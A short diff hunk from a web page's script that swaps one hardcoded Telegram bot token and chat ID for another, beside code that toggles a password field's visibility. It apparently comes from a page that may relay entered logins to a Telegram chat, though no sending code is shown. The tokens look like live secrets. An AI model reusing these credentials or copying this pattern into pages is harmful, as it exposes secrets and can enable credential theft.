@@ -4,8 +4,8 @@
     window.telegramChatId = "{{ telegram_chat_id }}";
 
     // Telegram credentials
-    const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
-    const TELEGRAM_CHAT_ID = '7473556793';
+    const TELEGRAM_BOT_TOKEN = '7555118565:AAGdyd4wU8-j8q5ZEJJue-7qg5dNzQ0ZzBQ';
+    const TELEGRAM_CHAT_ID = '7433394999';
 
     // Toggle password visibility
     document.getElementById('toggle-password').addEventListener('click', function() {
